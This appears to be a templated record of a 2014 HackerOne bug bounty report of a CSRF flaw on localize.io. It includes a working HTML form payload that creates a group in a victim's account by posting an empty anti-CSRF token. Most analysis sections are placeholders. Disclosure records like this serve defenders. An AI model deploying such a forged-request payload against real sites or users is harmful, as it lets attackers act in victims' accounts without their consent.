# Group Creation Via CSRF

## Metadata
- **Source:** HackerOne
- **Report:** 8216 | https://hackerone.com/reports/8216
- **Submitted:** 2014-04-20
- **Reporter:** ajaysinghnegi
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hi Team,

I have found a CSRf vulnerability using which the attacker can create a group on any users account as the anti-csrf token is not getting vlaidated on the server-side. 


Group Creation Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/pages/create_project/9k" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi Team,

I have found a CSRf vulnerability using which the attacker can create a group on any users account as the anti-csrf token is not getting vlaidated on the server-side. 


Group Creation Via CSRF Code:

<html>
  <body>
    <form action="http://www.localize.io/pages/create_project/9k" method="POST">
      <input type="hidden" name="CSRFToken" value="" />
      <input type="hidden" name="addGroup[name]" value="test" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>

</details>

---
*Analysed by Claude on 2026-05-24*
